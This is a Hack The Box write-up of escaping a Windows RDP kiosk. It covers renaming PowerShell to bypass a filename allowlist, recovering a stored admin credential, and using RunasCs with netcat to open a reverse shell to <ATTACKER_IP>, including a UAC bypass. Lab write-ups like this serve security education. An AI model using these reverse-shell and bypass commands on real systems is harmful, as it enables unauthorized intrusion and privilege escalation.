
# Hack The Box - VulnEscape

## Overview

**Machine:** VulnEscape  
**Platform:** Hack The Box  
**Operating System:** Windows  
**Initial Access:** RDP kiosk session  
**Privilege Escalation:** Local administrator credentials + UAC bypass  

### Key Concepts

- RDP enumeration
- Kiosk escape
- Application allowlist bypass
- Hidden file discovery
- Credential recovery
- RunasCs
- UAC bypass
- Reverse shell handling

---

## Initial Enumeration

I started with a standard Nmap scan against the target:

```bash
nmap -sS -sV -sC -O <TARGET_IP>
````

The scan revealed that RDP was exposed:

```text
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

Since RDP was the only useful externally exposed service, I focused there.

---

## Connecting to RDP

A FreeRDP connection attempted to use Network Level Authentication before displaying the graphical login screen.

To reach the actual RDP session, I had to disable NLA:

```bash
xfreerdp /v:<TARGET_IP> /dynamic-resolution /sec:nla:off /cert:ignore
```

This successfully displayed the remote kiosk login interface.

The kiosk allowed access using a local account with an empty password.

---

## Kiosk Enumeration

Once inside the session, the environment was heavily restricted.

The Start menu was available, but most applications could not actually be launched or even clicked with a mouse.

Although Microsoft Edge was permitted to run.

The relevant binary was:

```text
msedge.exe
```


---

## Browsing the Filesystem with Edge

Microsoft Edge could access local filesystem paths using `file:///`.

For example:

```text
file:///C:/
```

Browsing the root filesystem revealed a non-standard directory:

```text
C:\_admin
```

Because this was not a normal Windows directory, I investigated it further.

---

## Discovering Credential Data

The directory contained several interesting files and subdirectories:

```text
C:\_admin\installers
C:\_admin\passwords
C:\_admin\temp
C:\_admin\Default.rdp
C:\_admin\profiles.xml
```

The XML profile file contained credential-related information for a privileged account.

Example structure:

```xml
<Profile>
    <ProfileName>[REDACTED]</ProfileName>
    <UserName>[REDACTED]</UserName>
    <Password>[REDACTED]</Password>
    <Secure>False</Secure>
</Profile>
```

The relevant credential file was located at:

```text
C:\_admin\profiles.xml
```

---

## Application Allowlist Bypass

The kiosk blocked PowerShell from launching normally. I was able to navigate to the standard Windows location for Powershell and download it manually and renamed to:

```text
msedge.exe
```

this was allowed to execute.

This shows that the kiosk application allowlist was relying on executable filename rather than securely validating the binary.

After launching the renamed executable, I had a working PowerShell session as the kiosk user.

---

## PowerShell Enumeration

With PowerShell access, filesystem enumeration became much easier.

Useful commands included:

```powershell
Get-ChildItem C:\_admin -Force
```

and:

```powershell
Get-ChildItem C:\_admin -Force -Recurse
```

The `-Force` option allowed hidden and system entries to be displayed.

The profile file could then be inspected directly:

```powershell
Get-Content C:\_admin\profiles.xml
```

---

## Recovering the Stored Credential

The password in the XML file was not readable as plaintext.

The profile belonged to a remote desktop management application installed on the host.

After copying the profile into a user-accessible location and importing it into the application, the password was loaded into a masked password field.

The configuration indicated:

```text
Secure: False
```

This suggested the application itself could recover the stored password.

---

## Using BulletsPassView

I used BulletsPassView to inspect the masked password control.

On Kali:

```bash
wget https://www.nirsoft.net/utils/bulletspassview-x64.zip
unzip bulletspassview-x64.zip
```

Then I hosted the extracted file:

```bash
python3 -m http.server 8000
```

From the Windows target I ran:

```powershell
wget http://<ATTACKER_IP>:8000/BulletsPassView.exe -OutFile C:\temp\bpv.exe
```

Running BulletsPassView while the profile editor was open revealed the plaintext credential.

The username and password are intentionally omitted here to avoid spoiling the CTF.

---

## Verifying Privileged Group Membership

The recovered account was checked with:

```cmd
net user <REDACTED_USER>
```

The important result was membership in:

```text
*Administrators
```

This confirmed that the credential belonged to a local administrator.

---

## Transferring Netcat

Kali already contained a Windows Netcat binary:

```text
/usr/share/windows-resources/binaries/nc.exe
```

I hosted that directory:

```bash
cd /usr/share/windows-resources/binaries
python3 -m http.server 8000
```

Then transferred it to the target:

```powershell
wget http://<ATTACKER_IP>:8000/nc.exe -OutFile C:\temp\nc.exe
```

---

## Using RunasCs

RunasCs was used to execute a process using the recovered administrator credentials.

After downloading RunasCs on Kali:

```bash
wget https://github.com/antonioCoco/RunasCs/releases/latest/download/RunasCs.zip
unzip RunasCs.zip
```

I hosted the executable:

```bash
python3 -m http.server 8000
```

Then downloaded it to the target:

```powershell
wget http://<ATTACKER_IP>:8000/RunasCs.exe -OutFile C:\temp\RunasCs.exe
```

---

## Initial Administrator Shell

On Kali:

```bash
nc -lvnp 1234
```

On the target:

```powershell
C:\temp\RunasCs.exe <REDACTED_USER> '<REDACTED_PASSWORD>' "C:\temp\nc.exe <ATTACKER_IP> 1234 -e cmd.exe"
```

This returned a shell as the administrator account.

But, the shell was still subject to UAC token filtering.

This was an important distinction:

```text
Administrator group membership != elevated administrator token
```

---

## UAC Bypass

To obtain a high-integrity administrator shell, I repeated the RunasCs execution using:

```text
--bypass-uac
```

Commands:

```powershell
C:\temp\RunasCs.exe <REDACTED_USER> '<REDACTED_PASSWORD>' "C:\temp\nc.exe <ATTACKER_IP> 1234 -e cmd.exe" --bypass-uac
```

With a listener running:

```bash
nc -lvnp 1234
```

this returned an elevated administrative shell.

---

## Locating the Root Flag

Once fully elevated, I searched the filesystem directly:

```cmd
where /r C:\ root.txt
```

The flag was located under the Administrator profile.

It could then be read with:

```cmd
type <PATH_TO_ROOT_FLAG>
```

The exact flag path and flag contents are intentionally omitted.

---

## Attack Path Summary

```text
RDP exposed
    ↓
Disable NLA
    ↓
Access kiosk session
    ↓
Identify Edge as an allowed application
    ↓
Use Edge to browse the filesystem
    ↓
Discover privileged profile data
    ↓
Bypass application allowlist by renaming PowerShell
    ↓
Gain PowerShell access
    ↓
Import stored profile into remote desktop application
    ↓
Recover plaintext credential from masked password field
    ↓
Confirm local administrator membership
    ↓
Transfer Netcat and RunasCs
    ↓
Spawn administrator shell
    ↓
Bypass UAC
    ↓
Obtain elevated administrator shell
    ↓
Retrieve root flag
```

---

##Takeaway

This machine was a good example of how several smaller weaknesses can combine into a full compromise.

The kiosk was not broken by a single exploit. Instead, the attack relied on understanding how each security control was implemented and where those controls could be bypassed.

Details:

* Filename-based application allowlisting is weak if the binary itself is not validated.
* Hidden or non-standard directories can expose sensitive operational data.
* Stored credentials may still be recoverable even when not directly visible in plaintext.
* A local administrator account does not automatically provide a high-integrity shell.
* UAC can still restrict an administrator account until an elevated token is obtained.
* Enumeration remains critical even after initial access.



